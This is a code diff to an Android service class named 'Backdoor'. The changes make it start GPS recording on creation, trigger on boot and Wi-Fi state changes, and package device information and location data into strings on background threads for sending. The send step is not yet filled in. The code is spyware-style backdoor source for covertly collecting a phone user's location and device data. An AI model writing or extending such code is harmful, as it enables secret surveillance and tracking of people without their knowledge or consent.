@@ -19,6 +19,8 @@ public class Backdoor extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        infoZipper.setContext(this);
+        infoZipper.startGpsRecord();
         //Toast.makeText(Auto.this, "sc start", Toast.LENGTH_SHORT).show();
     }
 
@@ -31,6 +33,7 @@ public class Backdoor extends Service {
     void onAction(String action){
         switch (action){
             case WifiManager.SUPPLICANT_CONNECTION_CHANGE_ACTION:
+            case WifiManager.NETWORK_STATE_CHANGED_ACTION:
                 onWifiChange();
                 break;
             case Intent.ACTION_BOOT_COMPLETED:
@@ -52,10 +55,21 @@ public class Backdoor extends Service {
         sendData();
     }
     void sendData(){
-        infoZipper.toString();
-        infoZipper.gpsInfo();
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                String zip=infoZipper.toStream();
+
+            }
+        }).start();
+
     }
     void onGpsFull(){
-
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                String zip=infoZipper.gpsStream();
+            }
+        }).start();
     }
 }
